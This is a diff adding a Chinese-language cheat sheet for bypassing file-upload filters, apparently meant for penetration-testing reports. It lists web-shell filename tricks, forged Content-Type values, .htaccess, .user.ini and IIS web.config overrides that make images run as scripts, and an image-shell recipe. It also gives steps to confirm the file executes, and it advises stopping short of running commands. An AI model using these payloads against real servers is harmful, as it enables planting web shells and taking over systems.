@@ -1,0 +1,59 @@
+# 文件上传绕过
+
+## 扩展名绕过
+shell.php.jpg
+shell.jpg.php
+shell.php5
+shell.php4
+shell.php3
+shell.phtml
+shell.pht
+shell.phar
+shell.PhP
+shell.php.
+shell.php%00.jpg
+shell.php;.jpg
+shell.php::$DATA
+shell.jsp.jpg
+shell.jspx
+shell.jspf
+shell.asp;.jpg
+shell.asa
+shell.cer
+shell.aspx
+shell.ashx
+
+## Content-Type 伪造
+image/jpeg
+image/png
+image/gif
+image/jpg
+text/plain
+
+## .htaccess 覆盖（Apache）
+AddType application/x-httpd-php .jpg
+AddType application/x-httpd-php .xxx
+SetHandler application/x-httpd-php
+
+## .user.ini 覆盖（PHP-FPM）
+auto_prepend_file=shell.jpg
+
+## 图片马
+GIF89a
+# 命令行合成: copy /b 1.gif + payload.php shell.gif
+# 验证: 访问上传后的 gif，若被解析则成功
+
+## web.config 覆盖（IIS）
+<?xml version="1.0"?>
+<configuration><system.webServer><handlers>
+<add name="x" path="*.jpg" verb="*" modules="IsapiModule"
+ scriptProcessor="C:\\Windows\\System32\\inetsrv\\asp.dll" resourceType="File"/>
+</handlers></system.webServer></configuration>
+
+## 绕过前端校验
+改 JS 校验逻辑 / 直接构造请求 / 禁用 JS
+
+## 验证是否解析（关键一步）
+1. 上传后访问文件 URL
+2. 返回源码 = 未解析；返回空白或报错 = 已解析
+3. 只到「能上传 + 能被解析」即足够交报告，不要真的执行命令
